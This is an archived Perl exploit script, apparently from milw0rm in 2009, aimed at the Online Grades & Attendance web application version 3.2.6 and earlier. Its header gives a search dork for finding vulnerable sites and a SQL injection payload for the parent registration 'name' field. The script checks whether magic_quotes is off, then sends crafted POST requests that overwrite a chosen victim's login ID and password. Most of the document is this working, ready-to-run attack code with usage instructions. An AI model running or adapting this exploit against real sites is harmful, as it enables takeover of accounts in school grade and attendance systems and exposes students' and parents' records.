<html><head><title>Online Grades & Attendance 3.2.6 Credentials Changer SQL Exploit</title></head><pre>#!/usr/bin/perl
#***********************************************************************************************
#***********************************************************************************************
#**	       										      **
#**  											      **
#**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
#   [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
#**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
#**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
#   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    
#**							                                      **
#**    											      **
#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
#**					  ¡PROUD TO BE SPANISH!	                              **
#**											      **
#***********************************************************************************************
#***********************************************************************************************
#
#----------------------------------------------------------------------------------------------
#|       (Post Form --&gt; Parent Register (name)) Credentials Changer (SQLi) EXPLOIT	      |
#|--------------------------------------------------------------------------------------------|
#|                           |    Online Grades &amp; Attendance v-3.2.6   |		      |
#|  CMS INFORMATION:          -----------------------------------------	               	      |
#|										              |
#|--&gt;WEB: http://www.onlinegrades.org/			          			      |
#|--&gt;DOWNLOAD: http://www.onlinegrades.org/		                  		      |
#|--&gt;DEMO: http://www.onlinegrades.org/demo_info					      |
#|--&gt;CATEGORY: CMS / Education								      |
#|--&gt;DESCRIPTION: Online Grades is based on the project, Basmati. It has all of the same      |
#|		features plus many new features. OG is a web based grade...		      |
#|--&gt;RELEASED: 2009-02-05								      |
#|											      |
#|  CMS VULNERABILITY:									      |
#|											      |
#|--&gt;TESTED ON: firefox 3						                      |
#|--&gt;DORK: &quot;Powered by Online Grades&quot;						              |
#|--&gt;CATEGORY: SQL INJECTION							              |
#|--&gt;AFFECT VERSION: &lt;= 3.2.6						 		      |
#|--&gt;Discovered Bug date: 2009-05-21							      |
#|--&gt;Reported Bug date: 2009-05-21							      |
#|--&gt;Fixed bug date: Not fixed								      |
#|--&gt;Info patch: Not fixed							              |
#|--&gt;Author: YEnH4ckEr									      |
#|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							      |
#|--&gt;WEB/BLOG: N/A									      |
#|--&gt;COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
#|--&gt;EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)		      |
#----------------------------------------------------------------------------------------------
#
#------------
#CONDITIONS:
#------------
#
#gpc_magic_quotes=OFF
#
#-----------------
#PRE-REQUIREMENTS
#-----------------
#
#Option --&gt; Self Registration --&gt; Allowed (Default value)
#
#-------
#NEED:
#-------
#
#Valid parent id
#
#---------------------------------------
#PROOF OF CONCEPT (SQL INJECTION):
#---------------------------------------
#
#Register module (name) is vuln to sql injection.
#
#Full name --&gt; y3nh4ck3r', id=1 ON DUPLICATE KEY UPDATE client_id='owned'#
#
#Other parameters --&gt; something
#
#
#Return: Change client_id to 'owned' for parent id=1
#
#
##############################################################################
##############################################################################
##**************************************************************************##
##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!         ##
##**************************************************************************##
##--------------------------------------------------------------------------##
##**************************************************************************##
## GREETZ TO: JosS, Ulises2k, J.McCray, Evil1 and Spanish Hack3Rs community!##
##**************************************************************************##
##############################################################################
##############################################################################
#
#
use LWP::UserAgent;
use HTTP::Request;
#Subroutines
sub lw
{
	my $SO = $^O;
	my $linux = &quot;&quot;;
	if (index(lc($SO),&quot;win&quot;)!=-1){
		$linux=&quot;0&quot;;
	}else{
		$linux=&quot;1&quot;;
	}		
	if($linux){
		system(&quot;clear&quot;);
	}
	else{
		system(&quot;cls&quot;);
		system (&quot;title Online Grades Attendance v-3.2.6 (Credentials changer) Exploit&quot;);
		system (&quot;color 02&quot;);
	}
}
sub request {
	my $userag = LWP::UserAgent-&gt;new;
	$userag -&gt; agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
	if($_[2] eq &quot;post&quot;){
		$request = HTTP::Request -&gt; new(POST =&gt; $_[0]);
		$request-&gt;referer($_[0]);
		$request-&gt;content_type('application/x-www-form-urlencoded');
		$request-&gt;content($_[1]);
	}else{
		$request = HTTP::Request -&gt; new(GET =&gt; $_[0]);
	}
	my $outcode= $userag-&gt;request($request)-&gt;as_string;
	return $outcode;
}
sub error {
print &quot;\t------------------------------------------------------------\n&quot;;
	print &quot;\tWeb isn't vulnerable!\n\n&quot;;
	print &quot;\t---&gt;Maybe:\n\n&quot;;
	print &quot;\t\t1.-Patched.\n&quot;;
	print &quot;\t\t2.-Bad path or host.\n&quot;;
	print &quot;\t\tEXPLOIT FAILED!\n&quot;;
	print &quot;\t------------------------------------------------------------\n&quot;;
}
sub errormagicquotes {
print &quot;\t------------------------------------------------------------\n&quot;;
	print &quot;\tWeb isn't vulnerable!\n\n&quot;;
	print &quot;\t\tRaison--&gt; Magic quotes ON.\n&quot;;
	print &quot;\t\tEXPLOIT FAILED!\n&quot;;
	print &quot;\t------------------------------------------------------------\n&quot;;
}
sub helper {
	print &quot;\n\t[!!!] Online Grades &amp; Attendance &lt;= v-3.2.6 (Credentials changer) Exploit\n&quot;;
	print &quot;\t[!!!] USAGE MODE: [!!!]\n&quot;;
	print &quot;\t[!!!] perl $0 [HOST] [PATH] [Email Address] [Password] [Target_id]\n&quot;;
	print &quot;\t[!!!] [HOST]: Web.\n&quot;;
	print &quot;\t[!!!] [PATH]: Home Path.\n&quot;;
	print &quot;\t[!!!] [Email Address]: Set value\n&quot;;
	print &quot;\t[!!!] [Password]: Set value\n&quot;;
	print &quot;\t[!!!] [Target_id]: victim id\n&quot;;
	print &quot;\t[!!!] Example: perl $0 'www.onlinegrades.org' 'demo' 'y3nh4ck3r' 'y3nh4ck3r' '1' \n&quot;;
}
#Main
&amp;lw;
print &quot;\t#######################################################\n\n&quot;;
print &quot;\t#######################################################\n\n&quot;;
print &quot;\t##        Online Grades &amp; Attendance &lt;= v-3.2.6      ##\n\n&quot;;
print &quot;\t##           (Credentials changer) Exploit           ##\n\n&quot;; 
print &quot;\t##         ++Conditions: magic_quotes=OFF            ##\n\n&quot;;
print &quot;\t##         ++Needed: Valid parent id                 ##\n\n&quot;;
print &quot;\t##               Author: Y3nh4ck3r                   ##\n\n&quot;;
print &quot;\t##      Contact:y3nh4ck3r[at]gmail[dot]com           ##\n\n&quot;;
print &quot;\t##            Proud to be Spanish!                   ##\n\n&quot;;
print &quot;\t#######################################################\n\n&quot;;
print &quot;\t#######################################################\n\n&quot;;
#Init variables
my $host=$ARGV[0];
my $path=$ARGV[1];
my $client_id=$ARGV[2];
my $client_pw=$ARGV[3];
$numArgs = $#ARGV + 1;
if($numArgs&lt;=3) 
	{
		&amp;helper;
		exit(1);	
	}	
	if(!$ARGV[4]){
		$target_id=1;
	}else{
		$target_id=$ARGV[4];	
	}

#Build uri
my $finalhost=&quot;http://&quot;.$host.&quot;/&quot;.$path.&quot;/parents/register.php?action=register&quot;;
my $phpinfo=&quot;http://&quot;.$host.&quot;/&quot;.$path.&quot;/include/phpinfo.php&quot;;
#sql injection	
$injection=&quot;y3nh4ck3r', id=&quot;.$target_id.&quot; ON DUPLICATE KEY UPDATE client_id='&quot;.$values.&quot;'#&quot;;
$post=&quot;name=&quot;.$injection.&quot;&amp;email=y3nh4ck3r%40gmail.com&amp;pass1=y3nh4ck3r&amp;pass2=y3nh4ck3r&quot;;
$output=&amp;request($phpinfo,0,'get');
if($output=~(/\&lt;tr\&gt;\&lt;td class\=\&quot;e\&quot;&gt;magic\_quotes\_gpc\&lt;\/td\&gt;\&lt;td class\=\&quot;v\&quot;\&gt;On\&lt;\/td\&gt;\&lt;td class\=\&quot;v\&quot;\&gt;On\&lt;\/td\&gt;\&lt;\/tr\&gt;/)){
	&amp;errormagicquotes;
	exit(1);
}
$injection_email=&quot;y3nh4ck3r', id=&quot;.$target_id.&quot; ON DUPLICATE KEY UPDATE client_id='&quot;.$client_id.&quot;'#&quot;;
$post=&quot;name=&quot;.$injection_email.&quot;&amp;email=y3nh4ck3r%40gmail.com&amp;pass1=y3nh4ck3r&amp;pass2=y3nh4ck3r&quot;;
$output=&amp;request($finalhost, $post, 'post');
$injection_pw=&quot;y3nh4ck3r', id=&quot;.$target_id.&quot; ON DUPLICATE KEY UPDATE client_pw='&quot;.$client_pw.&quot;'#&quot;;
$post=&quot;name=&quot;.$injection_pw.&quot;&amp;email=y3nh4ck3r%40gmail.com&amp;pass1=y3nh4ck3r&amp;pass2=y3nh4ck3r&quot;;
$output=&amp;request($finalhost, $post, 'post');
#processed
if($output!~(/\&lt;strong\&gt;ERROR\&lt;\/strong\&gt;/))
{  
		print &quot;\n\t-----------------------------------------------------------------\n&quot;;
		print &quot;\t--  EXPLOIT EXECUTED (Online Grades &amp; Attendance &lt;= v-3.2.6)   --\n&quot;;
		print &quot;\t--                  (Credentials changer) Exploit              --\n&quot;;
		print &quot;\t-----------------------------------------------------------------\n\n&quot;;
		print &quot;\t\tParent credentials changed!\n\n&quot;;
		print &quot;\t\tIf id doesn't exist, you add a new inconsistent user!\n\n&quot;;
		print &quot;\n\t&lt;&lt;&lt;&lt;&lt;&lt;----------------------FINISH!----------------&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;\n\n&quot;;
		print &quot;\t&lt;&lt;&lt;&lt;&lt;&lt;--------------Thanks to: y3hn4ck3r------------&gt;&gt;&gt;&gt;&gt;&gt;&gt;\n\n&quot;;
		print &quot;\t&lt;&lt;&lt;&lt;&lt;&lt;-----------------------EOF--------------------&gt;&gt;&gt;&gt;&gt;&gt;&gt;\n\n&quot;;
}else{
	&amp;error;
}
exit(1);
#Ok...all job done

# milw0rm.com [2009-06-01]</pre></html>